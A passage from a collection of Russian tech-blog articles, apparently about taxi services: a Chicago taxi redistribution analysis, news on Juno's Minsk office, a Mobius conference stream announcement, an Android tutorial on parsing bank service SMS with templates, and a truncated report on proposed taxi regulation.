но это еще не все.\nЧтобы задача поиска потока, удовлетворяющего потребности всех \"центров потребления\" и реализующего мощности всех \"центров производства\" вообще была разрешима, суммарный дисбаланс всех вершин, очевидно, должен быть равен нулю. Можно ли выполнения последнего свойства ожидать для графов обслуживания такси? Выглядит весьма правдоподобным, что в графах построенных для утренних часов, когда потребность в машинах такси растет, суммарный дисбаланс будет отрицательным, а для вечерних — наоборот. Давайте представим, как с этой проблемой может справляться служба такси: разумным было бы введение такого графика работы для таксистов, при котором число задействованных машин всегда адекватно соответствовало бы спросу. Чтобы учесть это, в своем алгоритме я добавил к графу дополнительную вершину \"дом\" с ребрами большой стоимости (40 минут), идущими в каждый район, и незначительной, идущими обратно.\nКстати, если Вам понадобится когда-нибудь численно решать задачу поиска потока минимальной стоимости, крайне не советую прибегать к сомнительным источникам вроде Википедии или различных форумов, советующих устаревшие для этого алгоритмы Форда-Беллмана или потенциально зацикливающийся сетевой симплекс-метод. Хорошие с точке зрения времени работы алгоритмы можно найти в этой статье.\n\"Под капотом\" прилагаемых к статье программ работает мой вариант алгоритма Эдмондса — Карпа. \nКаковы сравнительные издержки времени реализации алгоритма перераспределения в городе Чикаго?\nВ среднем за неделю на выполнение заказов в Чикаго таксисты вместе тратят 275 млн. секунд, простаивают в ожидании 315 млн. секунд, в то время как алгоритм перераспределения отнимал бы у них всего 30 млн секунд.\nМожно ли считать, что все издержки времени при идеальной организации перевозок это время выполнения либо заказов, либо предписаний алгоритма перераспределения трафика?\nК сожалению, нет! Пусть, к примеру, в некотором районе в понедельник между 9-ю и 10-ю утра ожидается 25 заказов, 15 освободившихся после высадки пассажиров машин и еще 10, дополнительно переброшенных из профицитных районов. Казалось бы, число свободных и требующихся машин находится за этот период находится в балансе, стоит ли тогда рассчитывать суметь выполнить все заказы? Даже если ожидаемые числа совпадут с реальными, порядок, в котором будут поступать свободные машины и заявки на них, вообще говоря, произвольный. Чтобы гарантировать на момент поступления заказа наличие свободной машины, последних придется всегда держать небольшой запас. Запас машин, который с большой вероятностью не истощится за время задержки в их перераспределении (порядка 15-ти минут), есть (пуассоновский характер распределений) приблизительно два квадратных корня из ожидаемого числа заказов за этот период.\nДовольно неожиданно, что время, теряющееся в таких очередях, куда больше времени затраченного на выполнение алгоритма перераспределения и составляет примерно 114 млн секунд в неделю. Можно ли его как-то сократить?\nКое-что придумать можно. Одна из идей заключается в следующем: если машины такси, доставляющие пассажиров в некоторый район, прибывают со средним интервалом в минуту, то от очередного заказа не стоит отказываться, даже когда свободных машин на момент его поступления и вовсе нет: самое большее через три минуты хотя бы одна такая наверняка появится. Правда, у этой выжидательной стратегии есть один минус — увеличивается \"время подачи\" автомобиля. В моем алгоритме я уменьшил размер очереди в каждом районе на среднее количество прибывающих туда за 5 минут автомобилей. Такая мера должна лишь в редких случаях увеличить \"время подачи\" на пять минут, а вот суммарные потери на простое в очередях по расчетам должны сократиться более чем в двое, сведя их до 50 млн секунд в неделю.\nКаков итоговый результат?\nДля Чикаго в соответствии с расчетами (их программы вы найдете но ссылкам ниже) использование алгоритма перераспределения свободных машин в комбинации с управлением размера их очередей в каждом отдельном районе позволили бы увеличить долю времени приходящуюся на транспортировку пассажиров с 46% до 77%. Если расчеты верны, то их внедрение в Чикаго позволило бы экономить примерно 15 млн $ в год, а в городах размера Москвы около 100 млн $ — деньги, которые сейчас просто остаются лежать на дороге и не приносят пользу никому.\nПроекты кода, относящиеся к этой задаче доступны по ссылке.\nПримечания о данных\nВ расчетах я использовал данные за весь 2016 год. Два месяца назад полей в датасете было побольше и среди них было много информации о точных координатах и об оплате заказа. Видимо, часть из них были скрыты в коммерческих интересах служб такси, а часть из за проблем с личной жизнью. Мне не нужны были все имеющиеся на тот момент поля, и файл с которым я в итоге начал работу можно найти по ссылке. Одна запись в нем состоит из:\n\nшифра номера заказа,\nшифра номера машины,\nдаты и времени посадки и высадки, округленных до ближайших отметок на часах, кратных 15 минутам,\nдлинны пути в милях,\nвремени выполнения заказа в секундах,\nадминистративных зон Чикаго, в которой была произведена посадка и соответственно высадка,\nпримерные геокоординаты места посадки и места высадки.\n\nЭтот файл имеет размер почти в восемь гигабайт, причем добрые две трети из них занимают неуместно длинные шифры. Чтобы мне было удобнее работать с данными, я заменил шифры на их порядковый номер при словарном упорядочивании, некоторые цифры перевел из текстового формата в числовой и сохранил записи как объекты пользовательского класса \"дата юнит\". По ходу дела я выбросил незначительное количество записей с совсем не реалистичными данными. Компактная упаковка позволила сократить место под тот же объем информации до 750 мегабайт. Последний файл также можно найти по ссылке, а формат хранения например в этой программе.\nПримечание об оценке времени обслуживания\nСреднее время выполнения заказов за неделю я получил, просуммировав времена выполнения заказов, указанных в записи о каждой поездке и разделил на 52. Как видите никакого волшебства. Чтобы найти время простоя, сначала я сформировал упорядоченный по времени список выполненных заказов для каждой машины и вычитая из времени начала следующего заказа в списке время завершения предыдущего я получил новые списки так называемых \"таймаутов\". Тут возникло две трудности. Как я уже упоминал в примечаниях о данных, записи о времени посадки и высадки — это не настоящие времена, а их округления до ближайших отметок на циферблате, кратных 15-ти минутам. Вторая трудность состояла в том чтобы не учитывать перерывы между рабочими сменами в качестве простоя. Вторую я решил выгрузив распределение \"таймаутов\" случайных 30 машин, откуда было видно, что времена ожидания порядка 15-45 минут — характерное явление, причем достаточно часто бывают и часовые простои. Из этого всего я сделал вывод включать в расчет времени простоя только \"таймауты\" меньше полутора часов, а остальные игнорировать. Первую трудность я обошел просто просуммировав все принимаемые в расчет \"таймауты\". Почему так можно делать? Это могло бы стать занимательной задачей по теории вероятностей — показать, что, если карандаш длинны L случайным образом располагать на линейке и округлять координаты его концов до ближайших целых, то математическое ожидание разности этих округленных значений как раз и будет равно длине карандаша. \nПримечания об оценке времени пути между районами\nПервая идея такой оценки состояла в усреднении времени по всем имеющимся записям поездок из одного района в другой для данного времени суток и дня недели. Однако мне показалось, что такая величина будет слегка завышена из-за всякого рода времени укладки багажа, высадки и посадки пассажиров, а так же проезду к крыльцу дома по узким улочкам, куда совершенно нет необходимости отправлять машины, реализуя просто их переброску. Поэтому я упрощенно предположил, что время заказа есть некоторая константа задержки плюс величина, пропорциональная расстоянию, указанному в заказе. Константу я отсек применив метод наименьших квадратов (смотрите в этой программе), а затем усреднил только второе слагаемое. Если доля константы во времени заказа была больше трети, я вычитал только треть.", {"day": "13", "month": "мая", "time": "19:09"}, {"rate": 53, "views": 34000}], ["Офис Juno в Минске \n\r\nПредприниматели Игорь Магазиник и Тальмон Марко продолжают успешно работать с минскими программистами. Здесь они разработали программу Viber, которую вскоре продали за $900 млн, а теперь очень близки к продаже ещё одного стартапа Juno. Стоимость Juno с центром разработки в Минске оценивается в $250 млн, пишет TechCrunch со ссылкой «на многочисленные источники». \n\r\nПрограмма для отслеживания и вызова такси Juno позиционируется как один из конкурентов Uber. Покупателем выступает компания Gett — один из самых сильных конкурентов Uber. Сделка находится на «продвинутом этапе» оформления. Это значит, что по каким-то причинам теоретически она может сорваться, хотя ни одна из сторон в этом не заинтересована.\n\r\nПосле консолидации Juno и Gett смогут составить ещё большую конкуренцию лидеру на рынке — компании Uber, которая сейчас работает в 579 городах мира и оценивается в $60 млрд, а также прочим конкурентам вроде Lyft.\n\n\nТальмон Марко (слева) и Игорь Магазиник. Фото: Андрей Давыдчик, dev.by \n\r\nСовладельцы Juno Игорь Магазиник и Тальмон Марко основали этот стартап через год после того как продали предыдущий стартап Viber компании Rakuten за $900 млн. \n\r\nПредприниматели хорошо профинансировали стартап Juno, который заявил о себе в 2016 году как прямой конкурент Uber, с миссией переманить водителей Uber на более выгодную систему оплаты и более гуманную модель работы. С водителей Juno взимается на 60-65% меньшая комиссия, чем Uber. Компании удалось быстро захватить значительную долю рынка каршеринга в Нью-Йорке.\n\n\n\r\nМагазиник и Марко решили, что нет смысла переносить разработку в другое место, если минские программисты настолько хорошо проявили себя в случае с Viber (не считая десктопный клиент, конечно). За год работы штат минского офиса Juno Lab превысил 80 человек.\n\r\n«Есть одна вещь, которую я чётко понял за время работы в Беларуси: центр разработки здесь — это очень хорошая идея. Мы абсолютно не обязаны строить новую компанию именно здесь и не давали обещаний в духе Шварценеггера: I’ll be back. Но мы нашли здесь разработчиков высочайшего класса — как профессионально, так и чисто по-человечески», — сказал Тальмон Марко в интервью dev.by.\n\r\nДиректор Juno Lab Minsk Алексей Минкевич сказал, что разработка в Минске выгодна по причине больших налоговых льгот для программистов в этой стране.\n\n\nИгорь Магазиник и работники минского офиса Juno \n\r\nКонкуренция Uber и Juno выглядит немного забавно с точки зрения программной разработки, ведь Uber расширяет центр разработки в Вильнюсе, то есть буквально по соседству с минским центром разработки Juno.", {"day": "26", "month": "апреля", "time": "14:08"}, {"rate": 11, "views": 12000}], ["Всем привет! Те, кто следит за нашим блогом, уже заметили, что мы выкладывали в открытый доступ трансляцию главного зала последних двух наших Java-конференций. Что ж, мы видим, что вам это нравится, поэтому продолжаем: в этот раз трансляция мы делаем оналйн-трансляцию второго дня конференции по мобильной разработке Mobius 2017. \n\nЗавтра с 10 утра мы начинаем бесплатную YouTube-трансляцию первого трека конференции! Первый трек – самый большой и популярный среди наших участников, – будут доклады об архитектурах мобильных приложений, кодогенерации, и кое-чем другом. В главном зале большая часть докладов посвящена Android, однако есть пара докладов и для iOS-разработчиков.\n\r\nСсылка на трансляцию и подробную программу – под катом.\n\n\nПрограмма трека\nДенис Неклюдов и Степан Гончаров — Современный подход к архитектуре Android-приложения: RxJava, Kotlin, MVVM\n\r\nДоклад посвящен ещё одному взгляду на архитектуру Android-приложения разработчика, который подумал «а зачем писать лишний код и сложные неподдерживаемые конструкции, так щедро предоставляемые MVP-подходом», а именно MVVM в реактивном окружении.\n\r\nРассказ о том, как хорошо можно жить, когда у тебя DataBindings, RxJava, Kotlin, кэш на Firebase, DI на Dagger 2.\n\n\nГригорий Джанелидзе — Кодогенерация от А до Я\n\r\nДоклад инженера из Однокласников, посвященый кодогенерации — одному из трендов разработки последних лет. На текущий момент почти не существует проектов, где не использовалось бы хоть что-то из следующего списка: Dagger2, Butterknife, DataBinding, IcePick, Retrolambda, LoganSquare… Для многих разработчиков на этом кодогенерация и заканчивается: взял библиотеку, написал пару аннотаций и радуешься. Но на самом деле она позволяет делать куда больше, и доклад поведает о возможностях и инструментах для кодогенерации, подкрепляя каждый практическими примерами. \n\r\nТемы, которые будут затронуты: Annotation Processing, AspectJ, Bytecode Weaving, Jack Plugins.\n\n\nКонстантин Цховребов — Cicerone: Навигация в MVP без боли и слёз\n\r\nДоклад расскажет о реализации гибкой, простой и функциональной навигации по экранам при использовании MVP в Android. Покажет, как сделать код навигации чистым, lifecycle —безопасным, а любую, даже самую навороченную цепочку переходов по экранам — делом пары строк. Поможет с написанием unit-тестов для логики переходов. Подскажет, как расширять и дополнять представленный подход.\n\r\nПо ходу доклада будут рассмотрены особенности Android-архитектуры в плане навигации, составлен список требований для идеальной навигации и их реализация. Будут упомянуты фреймворки Flow и Conductor. Кроме того, Константин расскажет о своей библиотеке Cicerone (Чичероне).\n\n\nAleksander Piotrowski — ConstraintLayout all the things! \r\nЯзык доклада — английский.\n\r\nСовсем недавно состоялся релиз ConstraintLayout 1.0, так что самое время о нем поговорить. Он выглядит почти так же, как RelativeLayout, но содержит множество фич, более удобный тулинг в новых версиях Android. \n\r\nВ докладе будет рассматриваться не только практика использования ConstraintLayout и способ миграции своего приложения на него. Мы погрузимся в кишочки layout, чтобы понять, как он работает, почему лучше использовать вложенные макеты и даже посмотрим, как делать анимацию с их помощью!\n\n\nСергей Раков — Давайте думать над архитектурой\n\r\nЗатронем проблему выбора архитектурного подхода для iOS-приложений. Рассмотрим наиболее распространённые решения (MVC, MVVM, VIPER) с точки зрения критериев, которые могут быть важны в повседневной разработке, и проанализируем общую картину.\n\n\n\n\n\nЮрий Шмаков — MVP: Типичные задачи и способ их решения в Moxy\n\r\nПопулярность MVP в последнее время зашкаливает, как и число подходов к его реализации. Однако не все подходы одинаково хороши. В докладе будут разобраны проблемы, возникающие при имплементации MVP, их решения, а также рассказано, как их можно избежать с помощью Moxy. После этого доклада вы сможете вновь полюбить MVP, используя Moxy, или взять идеи из Moxy и применить их в своём решении.\n\n\nЙонатан Левин — Как сделать из вашего приложения продукт\n\r\nДоклад предпринимателя и инженера из Gett, человека, который одинаково хорошо ладит и с людьми, и с бэкендами, в котором он поделится своим многолетним опытом успешной разработки, позволяющем сделать приложение по-настоящему отличным. Как можно узнать, что пользователи делают в вашем приложении? Сколько есть времени для того, чтобы продемонстрировать пользователю его возможности? В чём разница между «ещё одним приложением» и продуктом, который становится важнейшей частью человеческой жизни?\n\r\nОжидайте масштабных откровений, сочных технических советов и кучу отсылок к «Звёздным войнам».\n\nТрансляция в перерывах\n\n\r\nОдна из сложностей, с которой мы столкнулись, делая трансляцию в прошлые разы – пустые перерывы и кофе-брейки. Пока участники на конференции пьют кофе и общаются со спикерами, зрители трансляции вынуждены смотреть на заглушки и ждать начала следующего доклада. \n\r\nВ этот раз в перерывах мы будем транслировать события, происходящие на конференции, а также интервью со спикерами. Вести интервью буду я вместе с phillennium – по результатам первого дня могу сказать, что скучать вам не придется. Вопросы, буде таковые вдруг возникнут, можно будет задать в Telegram-канале конференции: t.me/mobiusconf\n\nОграничения\n\nПоскольку трансляция бесплатная, она предоставляется по принципу as is: мы уверены, что все будет хорошо, но если вдруг что – не обессудьте!\nВидеозаписей не будет. То есть они, конечно, будут, но только для участников конференции, оставивших фидбек. А для всех остальных мы традиционно выложим их через 3-4 месяца.\nВы не сможете смотреть, что происходит в других залах. А там будет много интересного. В следующий раз регистрируйтесь и смотрите все без ограничений.", {"day": "21", "month": "апреля", "time": "09:45"}, {"rate": 16, "views": 6400}], ["Данная статья содержит описание внутреннего устройства умного обработчика служебных смс.\r\nПриложение парсит входящие смс-ки и показывает только важную информацию из них.\r\nПоказывает красиво, быстро и удобно.\n1. Как это работает\nВ манифесте прописываем разрешение на получение и чтение SMS\n<uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n<uses-permission android:name=\"android.permission.READ_SMS\"/>`\nТам же регистрируем receiver\r\nРазрешение action_sms_received_test нужно для тестирования.\r\nЧтобы не тратить деньги на настоящие смс во время тестирования, я отправляю Intent с этим action из приложения и ловлю его.\n<receiver android:name=\".receivers.SmsReceiver\">\n    <intent-filter android:priority=\"2147483647\">\n        <action android:name=\"android.provider.Telephony.SMS_RECEIVED\"/>\n        <action android:name=\"action_sms_received_test\"/>\n        <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n    </intent-filter>\n</receiver>\nТеперь ресивер будет получать все входящие сообщения\n@Override\npublic void onReceive(Context context, Intent intent) {\nswitch (intent.getAction()) {\n        case ACTION_SMS_RECEIVED:\n            handleIncomingSms(context, intent);\n            break;\n        case ACTION_SMS_RECEIVED_TEST:\n            // do test\n            break;\n    }\n}\nТеперь в методе handleIncomingSms(context, intent); требуется разобраться, что за СМС нам пришла, и принять решение о том, что делать.\r\nЕсли она является служебной — мы её разбираем, достаем полезную информацию, и отображаем её в красивом виде.\r\nКаким образом мы понимаем, служебная она или нет — опишу позже.\nГрубо, это выглядит так\nprivate void handleIncomingSms(Context context, Intent intent) {\n    L.i(\"handleIncomingSms\");\n    Bundle bundle = intent.getExtras();\n\n    if (bundle == null) {\n        return;\n    }\n\n    try {\n        Object[] pdus = (Object[]) bundle.get(PDUS);\n        String smsText = \"\";\n        for (Object pdu : pdus) {\n            final SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);\n            smsText += message.getMessageBody();\n        }\n        checkTemplates(context, smsText);\n    } catch (Exception e) {\n        L.i(\"handleIncomingSms - Exception\", Log.getStackTraceString(e));\n    }\n\n }\nМетод checkTemplates();\nprivate void checkTemplates(Context context, String smsText) {\n    L.i(\"checkTemplates\", smsText);\n\n    // get templates\n    List<SmsTemplate> smsTemplates = DatabaseManager.getSmsTemplates();\n\n    if (smsTemplates == null) {\n        return;\n    }\n\n    // check if sms text according to some template\n    for (SmsTemplate smsTemplate : smsTemplates) {\n        List<String> messageLines = SmsNewParser.getMessageLines(smsTemplate, smsText);\n        if (messageLines != null) {\n            Sender sender = DatabaseManager.getSender(smsTemplate.sender);\n            showPopupDialog(context, messageLines, sender != null ? sender.iconUrl : \"\");\n        }\n    }\n}\nМетод showPopupDialog\nprivate void showPopupDialog(Context context, List<String> message, String iconUrl) {\n    L.i(\"showPopupDialog\", message, iconUrl);\n\n    Intent popupIntent = new Intent(context, PopupActivity.class);\n    popupIntent.putExtra(PopupActivity.ICON_URL, iconUrl);\n    popupIntent.putExtra(PopupActivity.MESSAGE_0, message.get(0));\n    popupIntent.putExtra(PopupActivity.MESSAGE_1, message.get(1));\n    popupIntent.putExtra(PopupActivity.MESSAGE_2, message.get(2));\n    popupIntent.putExtra(PopupActivity.MESSAGE_3, message.get(3));\n    popupIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);\n\n    context.startActivity(popupIntent);\n\n}\nПосле этого пользователь видит такой экран\r\nСмысл в том, чтобы быстро увидеть полезную информацию\n\n2. Алгоритм распознавания СМС и выдачи важной информации\n2.1. Кратко\n\nНа сервере есть шаблоны\nВ каждом шаблоне указано а) как должна выглядеть СМС б) что именно показывать для неё\nПриложение при каждом запуске синхронизирует их\nКаждое входящее сообщение прогоняется по всем шаблонам\nЕсли найден шаблон, которому она соответствует — показывается важная информация в нужной форме\n\n2.2. Подробно о модели\nШаблон выглядит так\n{\n  \"sender\": \"bank_alfa\",\n  \"text\": \"3*8272; Pokupka; Uspeshno; Summa: 212,30 RUR; Ostatok: 20537,96 RUR; RU/MOSKVA/GETT; 15.04.2016 06:02:43\",\n  \"mask\": \"~N~*~N4~; ~BANK_ACTION_0~; Uspeshno; Summa: ~SUM_0~ ~CURRENCY_0~; ~BANK_ACTION_1~: ~SUM_1~ ~CURRENCY_1~; ~WORD~; ~N2~.~N2~.~N4~ ~N2~:~N2~:~N2~\",\n  \"lines\": [\n    {\n      \"line\": \"EXTRA_PURCHASE\"\n    },\n    {\n      \"line\": \"SUM_0\"\n    },\n    {\n      \"line\": \"EXTRA_TOTAL\"\n    },\n    {\n      \"line\": \"SUM_1\"\n    }\n  ]\n}\n\nsender — отправитель\ntext — начальный текст настоящей смс. может быть использован для тестов\nmask — сам шаблон. используются служебные слова вида ~FOO~\nlines — строки сообщения, которое будет выдаваться на экран. В них можно указывать части шаблона, а можно использовать слова, которых нет в шаблоне.\n\nСлужебные слова делятся на extra и обычные.\nExtra означает, что их нет в шаблоне.\r\nПримеры:\n~SUM~ — обычное служебное слово. Означает выражение с цифрами, разделенное точкой или запятой.\r\nИспользуется для определения суммы денег. Для его поиска используется regex\n{\n  \"name\": \"SUM\",\n  \"regex\": \"\\\\d+[.,]{0,1}\\\\d+\",\n  \"values\": [],\n  \"is_extra\": false\n}\n~CURRENCY~ — обычное слово, которое может принимать несколько значений. Для его поиска используется перебор его значений.\n{\n  \"name\": \"CURRENCY\",\n  \"regex\": \"\",\n  \"values\": [\n    {\n      \"value\": \"usd\"\n    },\n    {\n      \"value\": \"rur\"\n    },\n    {\n      \"value\": \"eur\"\n    },\n    {\n      \"value\": \"rub\"\n    }\n  ],\n  \"is_extra\": false\n}\n~EXTRA_CODE_WORD~ — служебное слово типа extra. Используется для вывода текста \"Кодовое слово\" в результате.\n{\n  \"name\": \"EXTRA_CODE_WORD\",\n  \"regex\": \"\",\n  \"values\": [\n    {\n      \"value\": \"Кодовое слово\"\n    }\n  ],\n  \"is_extra\": true\n}\nтакже нам нужны картинки, чтобы показать, кто именно отправил сообщение.\r\nЭта информация хранится в объектах sender.\nПример:\r\nЭто Альфа банк и его иконка.\n{\n    name: \"bank_alfa\",\n    icon_url: \"https://dl.dropboxusercontent.com/u/1816879/CaptainSms/logo_alfa.png\"\n}\nВ итоге не сервере хранится\n\nШаблоны\nСлужебные слова\nОтправители\n\nПолный json можно посмотреть здесь\n2.3. Подробно об алгоритме\nМы скачиваем модель, сохраняем её.\r\nДальше следует сама процедура разбора смс и создание результирующего сообщения.\nДля парсинга текста сообщения я использую класс SmsParser со статичными методами.\r\nГлавный метод — getMessageLines(SmsTemplate smsTemplate, String realSmsText)\r\nОн возвращает строки сообщения, если все ок, или null, если мы не нашли подходящий шаблон.\r\nЭтот метод вызывается из этого места метода checkTemplates, приведенного выше.\n    // check if sms text according to some template\n    for (SmsTemplate smsTemplate : smsTemplates) {\n        List<String> messageLines = SmsNewParser.getMessageLines(smsTemplate, smsText);\n        if (messageLines != null) {\n            Sender sender = DatabaseManager.getSender(smsTemplate.sender);\n            showPopupDialog(context, messageLines, sender != null ? sender.iconUrl : \"\");\n        }\n    }\nМы проходим по всем шаблонам из базы и пытаемся для каждого взять message lines.\r\nЕсли получилось — показываем экран с информацией..\nЛогика getMessageLines кратко\r\nБежим по маске и сравниваем её посимвольно с текстом смс, записывая в массив значения встретившихся служебных слов, или выкидывая nullесли встретили несоответствия\nЛогика getMessageLines подробнее:\n\nБежим посимвольно по тексту маски\nЕсли символ — это начало служебного слова (~), то:\r\n — Понимаем, что это за слово (например, ~SUM_0~)\r\n — Вычисляем его значение в тексте СМС (например, 255.00)\r\n — Отрезаем от маски это слово, а от текста это значение (чтобы дальше бежать посимвольно)\nИначе, если это простой символ, то:\r\n — Если они совпадают в максе и тексте, то отрезаем их оттуда и оттуда чтобы дальше сравнивать\r\n — Если они разные, то выкидываем null — текст не подходит под шаблон\n\nЛогика с примерами кода\nКак параметры, в метод нам приходят шаблон и текст смс\npublic static List<String> getMessageLines(SmsTemplate smsTemplate, String smsText)\nВ начале метода инициализируем лист служебных слов. В базу они попали из регулярного обновления с апи.\r\nНам нужна глобальная переменная, т.к. метод большой и разбит на части.\nprivate static void initReservedWords() {\n    L.i(\"initReservedWords\");\n    mReservedWords.clear();\n    mReservedWords = DatabaseManager.getReservedWords();\n}\nЗатем создаем список служебных слов из заданного шаблона.\n    List<ReservedWord> reservedWords = new ArrayList<>();\n    for (SmsTemplateLine line : smsTemplate.lines) {\n        reservedWords.add(getReservedWordByName(line.line));\n    }\nт.е. если у нас есть шаблон \n{\n  \"sender\": \"bank_alfa\",\n  \"text\": \"3*8272; Pokupka; Uspeshno; Summa: 212,30 RUR; Ostatok: 20537,96 RUR; RU/MOSKVA/GETT; 15.04.2016 06:02:43\",\n  \"mask\": \"~N~*~N4~; ~BANK_ACTION_0~; Uspeshno; Summa: ~SUM_0~ ~CURRENCY_0~; ~BANK_ACTION_1~: ~SUM_1~ ~CURRENCY_1~; ~WORD~; ~N2~.~N2~.~N4~ ~N2~:~N2~:~N2~\",\n  \"lines\": [\n    {\n      \"line\": \"EXTRA_PURCHASE\"\n    },\n    {\n      \"line\": \"SUM_0\"\n    },\n    {\n      \"line\": \"EXTRA_TOTAL\"\n    },\n    {\n      \"line\": \"SUM_1\"\n    }\n  ]\n}\nто мы хотим получить список \n\nEXTRA_PURCHASE\nSUM_0\nEXTRA_TOTAL\nSUM_1\n\nдалее идет основная логика\n    // check match symbol by symbol\n    try {\n\n        do {\n            String s = mask.substring(0, 1);\n            if (s.equals(ReservedWord.SYMBOL)) {\n\n                // found start of a reserved word\n                ReservedWord currentReservedWord = getFirstReservedWord(mask);\n                String valueOfCurrentReservedWord = getValueOfReservedWord(smsText, mask, currentReservedWord);\n\n                // add value in the list, if reserved word is in the list\n                if (reservedWords.contains(currentReservedWord) && valueOfCurrentReservedWord.length() > 0) {\n                    values.put(currentReservedWord.getForm(), valueOfCurrentReservedWord);\n                }\n\n                // cut text and mask to look next symbols\n                smsText = smsText.substring(valueOfCurrentReservedWord.length());\n                mask = mask.substring(currentReservedWord.getForm().length());\n\n            } else if (s.equals(smsText.substring(0, 1))) {\n\n                // that symbols matches, go to the next symbol\n                smsText = smsText.substring(1);\n                mask = mask.substring(1);\n\n            } else {\n               /*\n                * that symbol does not match, so text not match that mask, so method fails\n                * because we cannot return correct values according to that list of reserved word\n                */\n                return null;\n            }\n        } while (mask.length() > 0);\n    } catch (StringIndexOutOfBoundsException e) {\n        /*\n         * There is some error during parsing.\n         * That mean text does not match mask.\n         */\n        L.i(TAG, \"getMessageLines - Exception - \" + Log.getStackTraceString(e));\n        return null;\n    }\nОна делает ровно то, что описано выше, как \"Логика getMessageLines подробнее:\"\nДалее мы пересортировываем список, т.к. в тексте он встречается в другом порядке, чем наших message lines\n    // convert list to the right order\n    List<String> valuesList = new ArrayList<>();\n    for (ReservedWord word : reservedWords) {\n        LLog.e(TAG, \"getMessageLines - return list - \" + values.get(word.getForm()));\n        if (values.get(word.getForm()) != null) {\n            valuesList.add(values.get(word.getForm()));\n        }\n    }\nДалее мы добавляем служебные слова типа extra, т.к. мы их не находили при прохождении по тексту смс.\n    // add values of all the extra words\n    for (int i = 0; i < reservedWords.size(); i++) {\n        if (reservedWords.get(i).isExtra) {\n            valuesList.add(i, reservedWords.get(i).values.iterator().next().value);\n        }\n    }\nЭто нужно вот почему.\r\nНа вход нам подали smsTemplate. У него есть набор messageLines. Например, их было 4.\n  \"lines\": [\n    {\n      \"line\": \"EXTRA_PURCHASE\"\n    },\n    {\n      \"line\": \"SUM_0\"\n    },\n    {\n      \"line\": \"EXTRA_TOTAL\"\n    },\n    {\n      \"line\": \"SUM_1\"\n    }\n  ]\n}\nНо в процессе проверки текста на совпадение с шаблоном мы нашли только SUM_0 и SUM_1\r\nТ.к. это данные, которые реально есть в тексте СМС.\r\nТаким образом, после первого куска логики мы имеем массив из двух элементов (в данном случае 212,30 и 20537,96).\r\nНо на выход нам нужно подать 4 строки (к этим двум нужно еще добавить EXTRA_PURCHASE и EXTRA_TOTAL), причем в нужном порядке.\r\nПоэтому в конце метода мы их добавляем.\nВ итоге, на выходе мы получаем массив из четырех строк.\nНапример, если у нас был шаблон\n{\n  \"sender\": \"bank_alfa\",\n  \"text\": \"3*8272; Pokupka; Uspeshno; Summa: 212,30 RUR; Ostatok: 20537,96 RUR; RU/MOSKVA/GETT; 15.04.2016 06:02:43\",\n  \"mask\": \"~N~*~N4~; ~BANK_ACTION_0~; Uspeshno; Summa: ~SUM_0~ ~CURRENCY_0~; ~BANK_ACTION_1~: ~SUM_1~ ~CURRENCY_1~; ~WORD~; ~N2~.~N2~.~N4~ ~N2~:~N2~:~N2~\",\n  \"lines\": [\n    {\n      \"line\": \"EXTRA_PURCHASE\"\n    },\n    {\n      \"line\": \"SUM_0\"\n    },\n    {\n      \"line\": \"EXTRA_TOTAL\"\n    },\n    {\n      \"line\": \"SUM_1\"\n    }\n  ]\n}\nто на выходе мы получим\n\nПокупка\n212,30\nОсталось\n20537,96\n\nНа этом главная логика заканчивается.\r\nДалее мы просто показываем это в нашей попап активити таким методом\nshowPopupDialog(context, messageLines, sender != null ? sender.iconUrl : \"\");\nТекст messageLines просто отображается в текст вьюшках.\niconUrl подгружается в image view с помощью Glide — тут все предельно просто.\nЗаключение\nОчевидно, что алгоритм примитивен и может быть улучшен.\r\nИз идей\n\nразбить api на разные json файлы (например один json для каждого отправителя)\nумный алгоритм прогона по шаблонам (сначала все с кодами — они нужны быстрее всего, затем часто используемые, затем все остальные)\nвероятно, можно улучшить сам код парсинга (проверить на создание лишних объектов, уменьшить количество циклов и прочее)\n\nНо поставленную задачу приложние решает.\n\nПрилагаю главный класс для парсинга сообщений.\r\nОн немного отличается от кода, приведенного выше,\r\nт.к. приведенный код был улучшен визуально.", {"day": "28", "month": "июня", "time": "08:34"}, {"rate": 9, "views": 7000}], ["Министерство транспорта разработало поправки в законопроект «О государственном регулировании деятельности по перевозке пассажиров и багажа легковым такси в Российской Федерации». Поправки Минтранс начал готовить еще в 2015 году. На сегодняшний день из-под пера ведомства вышла «самая жесткая» версия поправок, полагают источники РБК.\n\r\nЕсли поправки будут приняты в текущем виде, то онлайн-сервисы не смогут устанавливать тарифы на перевозку без согласования с перевозчиками. Последние постоянно жалуются, что не могут конкурировать с их «заниженными» ценами онлайн-сервисов.\n\r\nТакси-сервис не является монополистом, у перевозчиков есть выбор, работать с ним по выставленным тарифам или не работать, рассуждает собеседник издания. Ему непонятна инициатива Минтранса. Необходимость согласования тарифов с перевозчиками скажется «не в пользу клиентов», согласен сотрудник онлайн-агрегатора перевозок.\n\r\nАгенты по перевозкам, в том числе онлайн-агрегаторы, должны тщательно выбирать контрагентов — таксомоторные парки и частников, считает Минтранс. \n\r\nОн предлагает, чтобы такие сервисы, как «Яндекс.Такси», Gett, Uber, проверяли у них разрешение на деятельность по перевозке пассажиров (и багажа) и документы о праве на предпринимательскую деятельность. До сих пор в законодательстве этих требований не было.\n\r\nНовые требования приведут к росту временных и материальных затрат со стороны такси-сервисов. \n\r\nПоправки вводят также ответственность агрегатора перед пассажирами за качество услуги. Однако собеседники РБК в нескольких крупных онлайн-агрегаторах такси напоминают, что являются лишь посредниками между пассажирами и перевозчиками и не могут нести такой ответственности. У Uber, «Яндекс.Такси» и Gett даже есть специальный пункт в соглашении с пользователями.\n\r\nПомимо перечисленных выше предложений, Минтранс выступает за фиксацию максимального количество выдаваемых в России разрешений на извоз. Если число желающих будет больше, должны быть проведены аукционы.\n\r\nОграничение числа разрешений — «здравая идея», считает гендиректор «Евротранссервиса» и председатель комитета по такси Московской торгово-промышленной палаты Богдан Коношенко. При этом он говорит, что нужно одновременно разрешить продавать лицензии, сдавать в аренду и передавать по наследству. Такие правила, к примеру, действуют в Нью-Йорке. Это поможет оградить рынок от недобросовестной конкуренции, полагает Коношенко.\n\r\nРанее издание «Коммерсант» сообщало, что Федерация автовладельцев России (ФАР) от имени таксистов пожаловалась премьер-министру Дмитрию Медведеву на ФАС из-за того, что служба отказалась возбуждать дела в отношении сервисов вызова такси Uber, Gett и 